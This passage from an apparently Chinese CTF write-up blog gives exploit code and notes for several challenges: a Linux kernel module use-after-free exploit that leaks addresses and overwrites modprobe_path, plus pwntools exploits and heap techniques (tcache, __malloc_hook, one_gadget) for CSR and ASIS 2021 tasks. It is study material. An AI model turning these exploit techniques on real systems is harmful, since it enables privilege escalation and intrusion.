class="hljs-number">0644</span> | IPC_CREAT)) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgget&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> qid;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">msg_send</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">char</span> *data, <span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    msgbuf.mtype = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">memcpy</span>(msgbuf.mtext, &amp;data[<span class="hljs-number">0x30</span>], size - <span class="hljs-number">0x30</span>);<br>    <span class="hljs-keyword">if</span> (msgsnd(qid, &amp;msgbuf, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgsnd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">msg_free</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    msgbuf.mtype = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (msgrcv(qid, &amp;msgbuf, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgsnd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">arb_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> <span class="hljs-title">data</span> =</span> &#123;<br>        .index = off,<br>    &#125;;<br><br>    <span class="hljs-comment">// change content</span><br>    msg_free(qid, <span class="hljs-number">0x80</span>);<br>    msg_send(qid, &amp;data, <span class="hljs-number">0x80</span>);<br><br>    query(<span class="hljs-number">20</span>, <span class="hljs-number">20</span>, <span class="hljs-number">22</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">crash</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Crashing...&quot;</span>);<br>    spark_open(<span class="hljs-number">0</span>);<br>    spark_open(<span class="hljs-number">1</span>);<br>    link(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    spark_close(<span class="hljs-number">1</span>);<br>    spark_finalize(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-keyword">size_t</span> kernel_stack, kernel_heap;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">leak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        crash();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    sleep(<span class="hljs-number">0.5</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get info from dmesg\n&quot;</span>);<br><br>    <span class="hljs-keyword">int</span> i, sz;<br>    <span class="hljs-keyword">char</span> *buf;<br>    <span class="hljs-comment">//*query the size of the kernel ring buffer</span><br>    sz = klogctl(<span class="hljs-number">10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    assert(sz != <span class="hljs-number">-1</span>);<br>    buf = <span class="hljs-built_in">malloc</span>(sz);<br>    <span class="hljs-comment">//*read all message from the kernel buffer into @buf.</span><br>    assert(klogctl(<span class="hljs-number">3</span>, buf, sz) != <span class="hljs-number">-1</span>);<br>    <span class="hljs-comment">// size_t kernel_heap, kernel_stack;</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sz &amp;&amp; (!kernel_stack || !kernel_heap); i++)<br>    &#123;<br>        <span class="hljs-comment">//*rax stores dis_arr</span><br>        <span class="hljs-keyword">if</span> (!kernel_stack &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RSP: 0018:&quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">10</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;kernel_stack) != <span class="hljs-number">1</span>)<br>                kernel_stack = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//*r9 stores the edge</span><br>        <span class="hljs-keyword">if</span> (!kernel_heap &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RBX: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;kernel_heap) != <span class="hljs-number">1</span>)<br>                kernel_heap = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    assert(kernel_stack &amp;&amp; kernel_heap);<br>    <span class="hljs-built_in">free</span>(buf);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leak kernel stack addr: %p\n&quot;</span>, kernel_stack);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leak kernel heap addr: %p\n&quot;</span>, kernel_heap);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffff98d5cdd2be80:	0xffffffffffffffff	0x000000000088770f</span><br><span class="hljs-comment">0xffff98d5cdd2be90:	0x000000000088770e	0x000000000088770d</span><br><span class="hljs-comment">0xffff98d5cdd2bea0:	0x000000000088770c	0x000000000088770b</span><br><span class="hljs-comment">0xffff98d5cdd2beb0:	0x000000000088770a	0x0000000000887709</span><br><span class="hljs-comment">0xffff98d5cdd2bec0:	0x0093037d5f064f38	0x0000000000887707</span><br><span class="hljs-comment">0xffff98d5cdd2bed0:	0x0000000000887706	0x0000000000887705</span><br><span class="hljs-comment">0xffff98d5cdd2bee0:	0x0000000000887704	0x0000000000887703</span><br><span class="hljs-comment">0xffff98d5cdd2bef0:	0x0000000000887702	0x0000000000887701</span><br><span class="hljs-comment">0xffff98d5cdd2bf00:	0x0000000000000000	0x0000000000000000</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> target_area_size 0x1000000</span><br><span class="hljs-keyword">size_t</span> cushion[target_area_size];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// size_t kernel_heap = strtoull(argv[1],0,16);    // input RBX by hand</span><br>    leak(); <span class="hljs-comment">// change to better way for leak</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> <span class="hljs-title">node</span> =</span> &#123;<br>        .id = <span class="hljs-number">0xffffffffffff</span>,<br>        .refcount = <span class="hljs-number">0</span>,<br>        .state_lock = &#123;<span class="hljs-number">0</span>&#125;,<br>        .finalized = <span class="hljs-number">1</span>,<br>        .nb_lock = &#123;<span class="hljs-number">0</span>&#125;,<br>        .num_edges = <span class="hljs-number">1</span>,<br>        .link_header.fd = <span class="hljs-number">0x1111</span>,<br>        .link_header.bk = <span class="hljs-number">0x2222</span>,<br>        .index = <span class="hljs-number">0x6666</span>,<br>        .tra = <span class="hljs-number">0</span>,<br>    &#125;;<br><br>    <span class="hljs-keyword">size_t</span> *fake_node = &amp;node;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        spark_open(i);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x10</span>; ++i)<br>        link(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span> - i, fake_node[<span class="hljs-number">0x10</span> - i]);<br><br>    spark_finalize(<span class="hljs-number">0</span>);<br><br>    spark_open(<span class="hljs-number">20</span>);<br>    spark_open(<span class="hljs-number">21</span>);<br>    spark_open(<span class="hljs-number">22</span>);<br>    link(<span class="hljs-number">20</span>, <span class="hljs-number">22</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// link( 20 , 21 , 0x7777777 );      // rip</span><br>    link(<span class="hljs-number">20</span>, <span class="hljs-number">21</span>, shellcode + <span class="hljs-number">4</span>);<br>    spark_close(<span class="hljs-number">21</span>); <span class="hljs-comment">// free node 21</span><br><br>    query(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// overwrite node 21</span><br><br>    spark_finalize(<span class="hljs-number">20</span>);<br><br>    <span class="hljs-comment">// get UAF node 21</span><br>    <span class="hljs-keyword">int</span> qid = msg_open();<br>    msg_send(qid, &amp;fake_node, <span class="hljs-number">0x80</span>);<br><br>    <span class="hljs-keyword">size_t</span> dis_heap_addr = kernel_heap;<br>    dis_heap_addr &amp;= ~(target_area_size - <span class="hljs-number">1</span>);<br>    dis_heap_addr -= target_area_size * <span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] init heap address of distanse array: %p\n&quot;</span>, dis_heap_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] cushion addr: %p\n&quot;</span>, cushion);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Searching ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; target_area_size; ++i)<br>        cushion[i] = <span class="hljs-number">0x7ffffffffffffff</span>;<br><br>    <span class="hljs-comment">// write to userland</span><br>    <span class="hljs-keyword">size_t</span> addr = ((<span class="hljs-keyword">size_t</span>)cushion - dis_heap_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[+] travsersal addr: %p\n&quot;</span>, addr);<br>    arb_write(qid, addr / <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">// find offset</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; target_area_size; ++i)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cushion[i] != <span class="hljs-number">0x7ffffffffffffff</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found at idx:%p content:%p addr:%p\n&quot;</span>, i, cushion[i], &amp;cushion[i]);<br>            dis_heap_addr += i * <span class="hljs-number">8</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] dis_heap_addr: %p\n&quot;</span>, dis_heap_addr);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// overwrite the ret address to shellcode().</span><br>    <span class="hljs-keyword">size_t</span> kernel_ret_addr = kernel_stack + <span class="hljs-number">0xa0</span>;<br>    arb_write(qid, (kernel_ret_addr - dis_heap_addr) / <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov rdi, [rsp+0x10];&quot;</span><br>        <span class="hljs-string">&quot;add rdi, 0x11b2097;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi, 0x792f706d742f;&quot;</span> <span class="hljs-comment">// &quot;/tmp/y&quot;</span><br>        <span class="hljs-string">&quot;mov [rdi], rsi;&quot;</span>          <span class="hljs-comment">// modprobe_path</span><br>        <span class="hljs-string">&quot;ud2;&quot;</span> ::<br>            :);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h2 id="getstat"><a href="#getstat" class="headerlink" title="getstat"></a>getstat</h2><blockquote>
<p>CSR 2021</p>
<p>这个比赛的pwn题好少, 就做个样子. 反而是cry(???)和ethereum较多. 而rev这种还有一题是unity背景, 这个也是不会的…..</p>
<p>不过看了别人的wp还是挺有趣的. </p>
</blockquote>
<p>比较简单, 直接提供shell()函数, 而且PIE. 有canary, 但是没有方法可以leak. 于是就得绕过. 覆盖返回地址.</p>
<p>主要的问题是无符号数输入加上这段:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000000000401109                 lea     rax, [rdx*8]<br>.text:0000000000401111                 and     rax, 0FFFFFFFFFFFFFFF0h<br>.text:0000000000401115                 sub     rsp, rax<br></code></pre></div></td></tr></table></figure>

<p>如果rdx是负数(一致性), 那么rsp减去负数就会增加, 导致栈<strong>收缩</strong>. </p>
<p>直接把rsp收缩到返回地址附近, 此时再覆盖地址即可. </p>
<p>唯一一个新问题是在python中把整数pack成浮点数. 新的方法如下:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iToF</span>(<span class="hljs-params">i</span>):</span><br>  b = struct.pack(<span class="hljs-string">&#x27;q&#x27;</span>, i)<br>  <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;d&#x27;</span>, b)[<span class="hljs-number">0</span>]<br></code></pre></div></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">Functions to convert between Python values <span class="hljs-keyword">and</span> C structs.<br>The optional first format <span class="hljs-keyword">char</span> indicates byte order, size <span class="hljs-keyword">and</span> alignment:<br>    @: native order, <span class="hljs-function">size &amp; <span class="hljs-title">alignment</span> <span class="hljs-params">(<span class="hljs-keyword">default</span>)</span></span><br><span class="hljs-function">    </span>=: native order, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    &lt;: little-endian, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    &gt;: big-endian, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    !: same as &gt;<br><br>The remaining chars indicate types of args <span class="hljs-keyword">and</span> must match exactly;<br>these can be preceded by a decimal repeat count:<br>    x: <span class="hljs-function">pad <span class="hljs-title">byte</span> <span class="hljs-params">(no data)</span></span>; c:<span class="hljs-keyword">char</span>; b:<span class="hljs-keyword">signed</span> byte; B:<span class="hljs-keyword">unsigned</span> byte;<br>    ?: <span class="hljs-built_in">_Bool</span> (<span class="hljs-keyword">requires</span> C99; <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> available, <span class="hljs-keyword">char</span> is used instead)<br>    h:<span class="hljs-keyword">short</span>; H:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>; i:<span class="hljs-keyword">int</span>; I:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>;<br>    l:<span class="hljs-keyword">long</span>; L:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>; f:<span class="hljs-keyword">float</span>; d:<span class="hljs-keyword">double</span>; e:half-<span class="hljs-keyword">float</span>.<br><span class="hljs-function">Special <span class="hljs-title">cases</span> <span class="hljs-params">(preceding decimal count indicates length)</span>:</span><br><span class="hljs-function">    s:<span class="hljs-title">string</span> <span class="hljs-params">(<span class="hljs-built_in">array</span> of <span class="hljs-keyword">char</span>)</span></span>; p: <span class="hljs-function">pascal <span class="hljs-title">string</span> <span class="hljs-params">(with count byte)</span>.</span><br><span class="hljs-function">Special <span class="hljs-title">cases</span> <span class="hljs-params">(only available in native format)</span>:</span><br><span class="hljs-function">    n:<span class="hljs-keyword">ssize_t</span></span>; N:<span class="hljs-keyword">size_t</span>;<br>    P:an integer type that is wide enough to hold a pointer.<br><span class="hljs-function">Special <span class="hljs-title">case</span> <span class="hljs-params">(<span class="hljs-keyword">not</span> in native mode unless <span class="hljs-string">&#x27;long long&#x27;</span> in platform C)</span>:</span><br><span class="hljs-function">    q:<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span></span>; Q:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span><br>Whitespace between formats is ignored.<br></code></pre></div></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iToF</span>(<span class="hljs-params">i</span>):</span><br>  b = struct.pack(<span class="hljs-string">&#x27;q&#x27;</span>, i)<br>  <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;d&#x27;</span>, b)[<span class="hljs-number">0</span>]<br>  <br>addr = <span class="hljs-number">0x401360</span><br><br>r = process(<span class="hljs-string">&#x27;./getstat&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;-10&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(iToF(addr)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.clean())<br></code></pre></div></td></tr></table></figure>

<hr>
<p>SSE instructions: </p>
<ul>
<li></li>
</ul>
<p>注意的点:</p>
<ul>
<li>分支分析, 就比如这个输入不符合浮点数的输入就会break. </li>
<li>无符号和有符号运算的一致性…</li>
</ul>
<h2 id="CSRunner"><a href="#CSRunner" class="headerlink" title="CSRunner"></a>CSRunner</h2><p>图一乐.</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Common_Language_Infrastructure">Common Language Infrastructure</a> (CLI)</li>
<li>IL2CPP</li>
</ul>
<h1 id="ASIS-CTF-2021"><a href="#ASIS-CTF-2021" class="headerlink" title="ASIS CTF 2021"></a>ASIS CTF 2021</h1><h2 id="Justpwnit"><a href="#Justpwnit" class="headerlink" title="Justpwnit"></a>Justpwnit</h2><p>no canary PIE. </p>
<p>输入一个负数, 然后覆盖rbp为堆指针, 最终stack pivot到heap上, 最后执行<code>exec(&quot;/bin/sh\x00&quot;, NULL, NULL)</code> </p>
<p>还在纠结system/read&amp;write/sendfile的时候发现还可以用<code>mov qword ptr [rax], rsi ; ret</code>来把/bin/sh写入bss段….</p>
<h2 id="Abbr"><a href="#Abbr" class="headerlink" title="Abbr"></a>Abbr</h2><blockquote>
<p>同上, 分数71, 应该是难一点点</p>
</blockquote>
<ul>
<li><code>strncasecmp</code>: compare two strings ignoring case. </li>
</ul>
<p>注意下stack pivot还可用xchg指令…. 可以刚好找到xchg esp, eax. 又因为PIE已关, 所以4字节能够装下bss和heap段的地址. </p>
<p>不过看到另一个exp里确实绕了一大圈使用了printf的任意读能力leak出地址. 有点复杂了. </p>
<h2 id="strvec"><a href="#strvec" class="headerlink" title="strvec"></a>strvec</h2><blockquote>
<p>github <a target="_blank" rel="noopener" href="https://github.com/kam1tsur3/2021_CTF/tree/master/asis/pwn/strvec">src</a>, 114 points</p>
</blockquote>
<p>找漏洞的过程完全就是一个人脑fuzzing…</p>
<p>保护全开. 大体思路仍来自别人的wp….</p>
<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>好了, 是下面代码的一个整数溢出, 可以做到一个很大的vec-&gt;size以及很小的malloc(size)</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-built_in">vector</span> *<span class="hljs-title">vector_new</span><span class="hljs-params">(<span class="hljs-keyword">int</span> nmemb)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (nmemb &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">int</span> size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">vector</span>) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">void</span>*) * nmemb;    <span class="hljs-comment">//8+8*n = 8*(n+1)</span><br>                                                        <span class="hljs-comment">//0x40000004</span><br>  <span class="hljs-built_in">vector</span> *vec = (<span class="hljs-built_in">vector</span>*)<span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> (!vec)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-built_in">memset</span>(vec, <span class="hljs-number">0</span>, size);<br>  vec-&gt;size = nmemb;<br>  <span class="hljs-keyword">return</span> vec;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这样的话get和set两个函数在一定范围内都没有了限制, 不过只能get heap段之后的地址区域. 好像只有heap了…</p>
<h3 id="Leak-heap-address"><a href="#Leak-heap-address" class="headerlink" title="Leak heap address"></a>Leak heap address</h3><p>到现在get了一个arbitrary read. 可以leak一下堆地址, 方法是通过get已释放的chunk的tcache链表指针. </p>
<p>然后呢?不知道了, 卡了半天, 没想到经验是如此的不足, 知道下一步是leak libc还是想不出来怎么做. </p>
<p>好吧现在想出来了, 就是靠伪造一个chunk然后再释放加入unsortedbin中就可以读取fd指针, 从而获得libc_base.</p>
<h3 id="Arbitrary-write"><a href="#Arbitrary-write" class="headerlink" title="Arbitrary write"></a>Arbitrary write</h3><p>方法是释放tcache struct, 放到unsorted bin中, 方法是先填满0x290大小的tcache链表, 使得再次free tcache struct的时候可以进入unsorted bin, 进而让fd和bk指针覆盖0x30的count变成一个很大的数值, 使得可以在tcache链上malloc任意数量的伪造的tcache fd指针, 最终分配到<code>__malloc_hook</code>, 实现修改下一次malloc时的流程控制.</p>
<p>卡了一会儿的是差点忘了释放0x420的chunk的时候会尝试前后合并, 而0x421会阻止后向合并, 此时必须设置好nextchunk的nextsize_inuse位, 以阻止前向合并. </p>
<h3 id="Pop-a-shell"><a href="#Pop-a-shell" class="headerlink" title="Pop a shell"></a>Pop a shell</h3><p>可以使用ROP的方式, 不过有canary的限制, 在此之前还要知道stack和canary的值. </p>
<p>更简单的方法是使用one_gadget一一检查有无满足对应条件的gadget, 这样只要覆盖malloc_hook到对应gadget地址即可.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./strvec.elf64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sa=<span class="hljs-keyword">lambda</span> x,y:p.sendafter(x,y)<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;chall.rumble.host&quot;</span>, <span class="hljs-number">5415</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(binary, aslr=<span class="hljs-literal">False</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">idx:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:</span><br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;idx =&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    ru(<span class="hljs-string">b&#x27;-&gt; &#x27;</span>)<br>    data = p.recvline(<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;[undefined]&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        log.error(<span class="hljs-string">&#x27;get idx:&#123;idx&#125; [undefined]&#x27;</span>)<br>    data = u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set</span>(<span class="hljs-params">idx:<span class="hljs-built_in">int</span>, data:<span class="hljs-built_in">bytes</span>=<span class="hljs-string">b&#x27;\x00&#x27;</span></span>):</span><br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;idx 